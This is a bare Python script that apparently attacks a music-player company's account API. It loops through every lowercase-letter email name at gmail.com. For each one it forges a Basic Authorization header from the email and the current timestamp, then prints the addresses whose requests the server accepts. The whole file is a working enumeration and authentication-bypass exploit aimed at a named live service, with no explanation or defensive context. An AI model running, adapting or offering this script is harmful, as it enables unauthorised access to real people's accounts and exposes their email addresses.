import requests
import time
import base64
import string
import itertools

numberList = list(range(0, 16))
characterList = list(string.ascii_lowercase)

def foo(l):
	for numItem in enumerate(numberList):
		yield from itertools.product(*([l] * numItem[0])) 

for x in foo("abcdefghijklmnopqrstuvwxyz"):
		time.sleep(1)
		email = ''.join(x) + "@gmail.com"
		timestamp = round(int(time.time()))
		authorization = email + ':' + str(timestamp)
		bytes = authorization.encode("utf-8")

		bytes = base64.b64encode(bytes)
		authorization = bytes.decode("utf_8")

		headers = {
			'Authorization': 'Basic ' + authorization
		}
		r = requests.get('https://api.stemplayer.com/accounts/access', headers=headers)
		if r.status_code == 200:
			print(email)